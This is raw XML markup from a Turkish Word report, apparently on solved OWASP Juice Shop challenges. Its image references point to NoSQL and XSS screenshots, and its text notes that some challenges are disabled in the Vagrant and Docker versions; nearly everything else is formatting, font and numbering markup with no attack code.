      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w:rsidR="00BB56F9" w:rsidRDefault="00BB56F9" w:rsidP="00DD1A3B">
      <w:r w:rsidRPr="00BB56F9">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5943600" cy="2696799"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="18" name="Resim 18" descr="C:\Users\drmsa\Desktop\Juice\başarı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rmsa\Desktop\Juice\başarı\a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56F9">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5943600" cy="2635004"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="24" name="Resim 24" descr="C:\Users\drmsa\Desktop\Juice\başarı\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rmsa\Desktop\Juice\başarı\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7"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5948809" cy="2637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B56F9">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5943600" cy="2598913"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="25" name="Resim 25" descr="C:\Users\drmsa\Desktop\Juice\başarı\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rmsa\Desktop\Juice\başarı\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29"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5946138" cy="2600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B56F9">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5943600" cy="2655425"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="27" name="Resim 27" descr="C:\Users\drmsa\Desktop\Juice\başarı\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rmsa\Desktop\Juice\başarı\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29"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5946667" cy="265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B56F9">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5943600" cy="723866"/>
            <wp:effectExtent l="0" t="0" r="0" b="635"/>
            <wp:docPr id="28" name="Resim 28" descr="C:\Users\drmsa\Desktop\Juice\başarı\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rmsa\Desktop\Juice\başarı\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51"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5947983" cy="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56F9" w:rsidRDefault="00BB56F9" w:rsidP="00DD1A3B">
      <w:r>
        <w:t>Bazı challangeler Vagrant ve Docker sürümü için kapalı hale getirilmiştir;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB56F9" w:rsidRDefault="00BB56F9" w:rsidP="00DD1A3B">
      <w:r w:rsidRPr="00BB56F9">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5943600" cy="437966"/>
            <wp:effectExtent l="0" t="0" r="0" b="635"/>
            <wp:docPr id="29" name="Resim 29" descr="C:\Users\drmsa\Desktop\Juice\başarı\Nsq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rmsa\Desktop\Juice\başarı\Nsql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56F9" w:rsidRPr="00DD1A3B" w:rsidRDefault="00BB56F9" w:rsidP="00DD1A3B">
      <w:r w:rsidRPr="00BB56F9">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3584575" cy="965835"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:docPr id="31" name="Resim 31" descr="C:\Users\drmsa\Desktop\Juice\başarı\X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rmsa\Desktop\Juice\başarı\XSS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575" cy="96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B56F9" w:rsidRPr="00DD1A3B">
      <w:headerReference w:type="even" r:id="rId49"/>
      <w:headerReference w:type="default" r:id="rId50"/>
      <w:footerReference w:type="even" r:id="rId51"/>
      <w:footerReference w:type="default" r:id="rId52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091E" w:rsidRDefault="0018091E">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="0018091E" w:rsidRDefault="001809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A2"/>
    <w:family w:val="roman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A2"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="00000687" w:usb1="00000000" w:usb2="00000000" w:usb3="00000000" w:csb0="0000009F" w:csb1="00000000"/>
  </w:font>
  <w:font w:name="HGMinchoB">
    <w:charset w:val="80"/>
    <w:family w:val="roman"/>
    <w:pitch w:val="fixed"/>
    <w:sig w:usb0="80000281" w:usb1="28C76CF8" w:usb2="00000010" w:usb3="00000000" w:csb0="00020000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HGGothicM">
    <w:charset w:val="80"/>
    <w:family w:val="modern"/>
    <w:pitch w:val="fixed"/>
    <w:sig w:usb0="80000281" w:usb1="28C76CF8" w:usb2="00000010" w:usb3="00000000" w:csb0="0002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26C8" w:rsidRDefault="0047436E">
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText>PAGE   \* MERGEFORMAT</w:instrText>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="0056687C">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:t>14</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:color w:val="A04DA3" w:themeColor="accent3"/>
      </w:rPr>
      <w:sym w:font="Wingdings 2" w:char="F097"/>
    </w:r>
    <w:r>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
  </w:p>
  <w:tbl>
    <w:tblPr>
      <w:tblW w:w="1950" w:type="pct"/>
      <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
    </w:tblPr>
    <w:tblGrid>
      <w:gridCol w:w="2654"/>
      <w:gridCol w:w="996"/>
    </w:tblGrid>
    <w:tr w:rsidR="00BC26C8">
      <w:trPr>
        <w:trHeight w:hRule="exact" w:val="72"/>
      </w:trPr>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="2718" w:type="dxa"/>
          <w:tcBorders>
            <w:top w:val="single" w:sz="12" w:space="0" w:color="438086" w:themeColor="accent2"/>
            <w:bottom w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
          </w:tcBorders>
        </w:tcPr>
        <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
          <w:pPr>
            <w:pStyle w:val="AralkYok"/>
          </w:pPr>
        </w:p>
      </w:tc>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="1017" w:type="dxa"/>
          <w:tcBorders>
            <w:bottom w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
          </w:tcBorders>
        </w:tcPr>
        <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
          <w:pPr>
            <w:pStyle w:val="AralkYok"/>
          </w:pPr>
        </w:p>
      </w:tc>
    </w:tr>
  </w:tbl>
  <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8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26C8" w:rsidRDefault="0047436E">
    <w:pPr>
      <w:jc w:val="right"/>
    </w:pPr>
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText>PAGE   \* MERGEFORMAT</w:instrText>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="0056687C">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:t>13</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:color w:val="A04DA3" w:themeColor="accent3"/>
      </w:rPr>
      <w:sym w:font="Wingdings 2" w:char="F097"/>
    </w:r>
    <w:r>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
  </w:p>
  <w:tbl>
    <w:tblPr>
      <w:tblW w:w="1950" w:type="pct"/>
      <w:jc w:val="right"/>
      <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
    </w:tblPr>
    <w:tblGrid>
      <w:gridCol w:w="1051"/>
      <w:gridCol w:w="2599"/>
    </w:tblGrid>
    <w:tr w:rsidR="00BC26C8">
      <w:trPr>
        <w:trHeight w:hRule="exact" w:val="72"/>
        <w:jc w:val="right"/>
      </w:trPr>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="1098" w:type="dxa"/>
          <w:tcBorders>
            <w:bottom w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
          </w:tcBorders>
        </w:tcPr>
        <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
          <w:pPr>
            <w:pStyle w:val="AralkYok"/>
          </w:pPr>
        </w:p>
      </w:tc>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="2732" w:type="dxa"/>
          <w:tcBorders>
            <w:top w:val="single" w:sz="12" w:space="0" w:color="438086" w:themeColor="accent2"/>
            <w:bottom w:val="single" w:sz="2" w:space="0" w:color="438086" w:themeColor="accent2"/>
          </w:tcBorders>
        </w:tcPr>
        <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8">
          <w:pPr>
            <w:pStyle w:val="AralkYok"/>
          </w:pPr>
        </w:p>
      </w:tc>
    </w:tr>
  </w:tbl>
  <w:p w:rsidR="00BC26C8" w:rsidRDefault="00BC26C8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091E" w:rsidRDefault="0018091E">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="0018091E" w:rsidRDefault="001809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5507790"/>
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<w:text/>
    </w:sdtPr>
    <w:sdtEndPr/>
    <w:sdtContent>
      <w:p w:rsidR="00BC26C8" w:rsidRDefault="00CC58B6">
        <w:pPr>
          <w:pStyle w:val="stBilgi"/>
          <w:pBdr>
            <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
          </w:pBdr>
        </w:pPr>
        <w:r>
          <w:t>Muhammed Said Bakırcı</w:t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66845816"/>
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<w:text/>
    </w:sdtPr>
    <w:sdtEndPr/>
    <w:sdtContent>
      <w:p w:rsidR="00BC26C8" w:rsidRDefault="00CC58B6">
        <w:pPr>
          <w:pStyle w:val="stBilgi"/>
          <w:pBdr>
            <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
          </w:pBdr>
          <w:jc w:val="right"/>
        </w:pPr>
        <w:r>
          <w:t>Muhammed Said Bakırcı</w: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2A6D92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AA46E61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B5E526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BA64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55EA7C8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7326DB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D3A6BF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E0E3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EF4EB1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68872E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5D11A9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="33B056D0"/>
    <w:numStyleLink w:val="KentselMaddearetliListe"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="11" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0EDC38E4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="33B056D0"/>
    <w:numStyleLink w:val="KentselMaddearetliListe"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="12" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="124B7CF1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7AC6A14E"/>
    <w:styleLink w:val="KentselNumaralListe"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="288" w:hanging="288"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:hint="default"/>
        <w:i w:val="0"/>
        <w:color w:val="A04DA3" w:themeColor="accent3"/>
        <w:sz w:val="20"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="upperLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="792" w:hanging="288"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="438086" w:themeColor="accent2"/>
        <w:sz w:val="20"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="1296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3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1800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4">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2304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5">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="2808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6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3312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7">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3816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8">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="4320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</w:abstractNum>
  <w:abstractNum w:abstractNumId="13" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="19BE3A5C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="33B056D0"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="216" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="A04DA3" w:themeColor="accent3"/>
        <w:sz w:val="18"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="461" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="438086" w:themeColor="accent2"/>
        <w:sz w:val="12"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="706" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="951" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1196" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1441" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1686" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1931" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2176" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="14" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="1A6C5517"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7AC6A14E"/>
    <w:numStyleLink w:val="KentselNumaralListe"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="15" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="1DDE73E0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="33B056D0"/>
    <w:numStyleLink w:val="KentselMaddearetliListe"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="16" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="251A0F72"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7AC6A14E"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="288" w:hanging="288"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:hint="default"/>
        <w:i w:val="0"/>
        <w:color w:val="A04DA3" w:themeColor="accent3"/>
        <w:sz w:val="20"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="upperLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="792" w:hanging="288"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="438086" w:themeColor="accent2"/>
        <w:sz w:val="20"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="1296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3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1800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4">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2304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5">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="2808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6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3312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7">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3816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8">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="4320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</w:abstractNum>
  <w:abstractNum w:abstractNumId="17" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="308C1F36"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3AE83DD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84D2ED82">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:color w:val="424456" w:themeColor="text2"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="553E7D70">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="180"/>
      </w:pPr>
      <w:rPr>
        <w:color w:val="424456" w:themeColor="text2"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="DEE48288">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:color w:val="424456" w:themeColor="text2"/>
      </w:r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35E71CD9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="39D65854"/>
    <w:lvl w:ilvl="0" w:tplc="0752545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  <w:color w:val="A04DA3" w:themeColor="accent3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36A80E22"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CF765A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3D9C46A3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="33B056D0"/>
    <w:styleLink w:val="KentselMaddearetliListe"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="Maddeareti1"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="216" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="A04DA3" w:themeColor="accent3"/>
        <w:sz w:val="18"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="Maddeareti2"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="461" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="438086" w:themeColor="accent2"/>
        <w:sz w:val="12"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="Maddeareti3"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="706" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="951" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1196" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1441" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1686" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1931" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2176" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="21" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="40B17DB9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A0BE2AD0"/>
    <w:lvl w:ilvl="0" w:tplc="C4045840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325F64" w:themeColor="accent2" w:themeShade="BF"/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
